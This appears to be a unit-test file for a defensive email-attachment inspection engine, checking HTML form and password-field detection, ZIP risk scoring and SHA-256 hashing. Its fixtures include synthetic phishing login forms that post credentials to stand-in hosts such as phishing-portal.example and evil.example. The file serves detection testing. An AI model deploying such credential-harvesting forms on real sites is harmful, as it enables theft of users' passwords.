"""
tests/test_payload_inspection.py

Unit tests for Phase 3 Safe Static Payload Inspection Engine:
- QR code static decoding
- HTML form action & password field extraction
- PDF text & link extraction
- ZIP archive metadata inspection & safety bounds
- SHA-256 calculation
"""

import io
import zipfile
import pytest
import numpy as np
import cv2
from services.payload_inspection import (
    inspect_qr_code,
    inspect_html_attachment,
    inspect_pdf_attachment,
    inspect_zip_attachment,
    inspect_attachment_payload
)


def test_html_static_parsing_form_and_passwords():
    html_content = b"""
    <!DOCTYPE html>
    <html>
    <head><title>Verify Corporate Credentials</title></head>
    <body>
        <h2>Account Login</h2>
        <form action="https://phishing-portal.example/login.php" method="POST">
            <input type="email" name="user_email" placeholder="Email Address" />
            <input type="password" name="user_password" placeholder="Password" />
            <button type="submit">Sign In</button>
        </form>
        <a href="https://external-auth.example/reset">Reset Password</a>
        <script src="https://tracking-analytics.example/track.js"></script>
    </body>
    </html>
    """
    res = inspect_html_attachment(html_content, filename="test.html")

    assert res["password_field_detected"] is True
    assert "https://phishing-portal.example/login.php" in res["form_actions"]
    assert "https://external-auth.example/reset" in res["extracted_urls"]


def test_zip_archive_safety_bounds():
    # Construct synthetic zip archive
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("invoice.pdf", b"Dummy PDF content")
        zf.writestr("malicious_script.exe", b"MZDummyExeHeaderBytes")
        zf.writestr("doc.docx", b"Dummy Docx content")

    zip_bytes = zip_buffer.getvalue()
    res = inspect_zip_attachment(zip_bytes, filename="test.zip")

    assert len(res["file_list"]) == 3
    assert res["risk_score"] >= 60
    assert "malicious_script.exe" in res["file_list"]


def test_payload_inspection_orchestrator():
    html_bytes = b"<html><form action='https://evil.example/auth'><input type='password'/></form></html>"
    res = inspect_attachment_payload(html_bytes, filename="login_form.html")

    assert res["format"] == "HTML"
    assert res["risk_score"] >= 70
    assert len(res["sha256"]) == 64
